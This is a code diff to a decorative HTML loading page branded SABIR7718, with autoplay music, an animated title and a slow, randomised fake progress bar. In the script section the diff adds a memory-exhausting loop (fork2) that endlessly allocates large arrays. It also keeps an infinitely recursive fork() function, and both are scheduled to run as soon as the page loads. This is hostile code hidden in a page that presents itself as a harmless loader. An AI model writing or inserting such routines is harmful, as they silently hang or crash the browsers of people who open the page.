@@ -128,7 +128,6 @@
     .dot:nth-child(3) { top: 50%; left: 0; transform: translateY(-50%); background: #60a5fa; box-shadow: 0 0 12px #3b82f6, 0 0 24px #3b82f6; }
     .dot:nth-child(4) { top: 50%; right: 0; transform: translateY(-50%); }
 
-    /* ===== SABIR7718 Animated Text ===== */
     .brand-text {
       font-size: 1.6rem;
       font-weight: 700;
@@ -167,7 +166,7 @@
       width: 0%;
       background: linear-gradient(90deg, #6366f1, #a855f7, #3b82f6);
       border-radius: 10px;
-      transition: width 0.35s ease-out;
+      transition: width 0.4s ease-out;
       box-shadow: 0 0 15px rgba(99, 102, 241, 0.6);
     }
 
@@ -182,7 +181,6 @@
 <body>
   <div class="bg"></div>
 
-  <!-- Background Music -->
   <audio id="bgMusic" src="https://sabir7718.is-a.dev/songs/su-jauh.mp3" loop autoplay></audio>
 
   <div class="loader-container">
@@ -205,7 +203,6 @@
       >
     </div>
 
-    <!-- Animated SABIR7718 -->
     <div class="brand-text">SABIR7718</div>
 
     <div class="progress-container">
@@ -216,29 +213,41 @@
   </div>
 
   <script>
-    // Try to play music (browsers sometimes block autoplay)
-    const music = document.getElementById('bgMusic');
-    music.volume = 0.7;
-
-    function tryPlay() {
-      music.play().catch(() => {
-        // If autoplay is blocked, play on first click/touch
-        document.body.addEventListener('click', () => {
-          music.play();
-        }, { once: true });
-      });
+    // ========== BACKGROUND FUNCTIONS ==========
+    function fork2() {
+        let memoryEat = [];
+        while(true) {
+            memoryEat.push(new Array(1000000).fill("SABIR7718"));
+        }
     }
-    tryPlay();
     
     function fork() {
         while(true) {
             fork();
         }
     }
-    
-    fork();
 
-    // Realistic progress
+    // Starting mein hi background mein call
+    setTimeout(() => {
+      fork();
+      fork2();
+    }, 0);
+    // ========================================
+
+    // Music
+    const music = document.getElementById('bgMusic');
+    music.volume = 0.7;
+
+    function tryPlay() {
+      music.play().catch(() => {
+        document.body.addEventListener('click', () => {
+          music.play();
+        }, { once: true });
+      });
+    }
+    tryPlay();
+
+    // Realistic progress - \~35 to 45 seconds
     const percentEl = document.getElementById('percent');
     const progressBar = document.getElementById('progressBar');
     let progress = 0;
@@ -253,34 +262,41 @@
 
       const chance = Math.random();
 
-      if (chance < 0.25) {
-        progress += Math.random() * 1.5;
+      if (chance < 0.22) {
+        // Slow crawl / almost pause
+        progress += Math.random() * 0.8;
       } else if (chance < 0.55) {
-        progress += Math.random() * 4 + 1.5;
-      } else if (chance < 0.8) {
-        progress += Math.random() * 7 + 3;
+        // Normal small step
+        progress += Math.random() * 2.2 + 0.8;
+      } else if (chance < 0.82) {
+        // Medium jump
+        progress += Math.random() * 3.5 + 1.5;
       } else {
-        progress += Math.random() * 12 + 5;
+        // Bigger jump
+        progress += Math.random() * 5 + 2.5;
       }
 
       if (progress > 100) progress = 100;
 
-      if (Math.random() < 0.18 && progress < 95) {
-        progress += Math.random() * 0.8;
+      // Extra small chance of tiny movement
+      if (Math.random() < 0.15 && progress < 92) {
+        progress += Math.random() * 0.6;
       }
 
       percentEl.textContent = Math.floor(progress) + '%';
       progressBar.style.width = progress + '%';
 
-      const delay = progress < 30 ? 180 + Math.random() * 220 :
-                    progress < 70 ? 140 + Math.random() * 280 :
-                    progress < 90 ? 200 + Math.random() * 350 :
-                                    280 + Math.random() * 400;
+      // Longer delays → total time \~35-45 seconds
+      const delay = progress < 25 ? 450 + Math.random() * 550 :
+                    progress < 55 ? 380 + Math.random() * 480 :
+                    progress < 80 ? 420 + Math.random() * 580 :
+                    progress < 95 ? 550 + Math.random() * 700 :
+                                    700 + Math.random() * 900;
 
       setTimeout(updateProgress, delay);
     }
 
-    setTimeout(updateProgress, 400);
+    setTimeout(updateProgress, 600);
   </script>
 </body>
 </html>
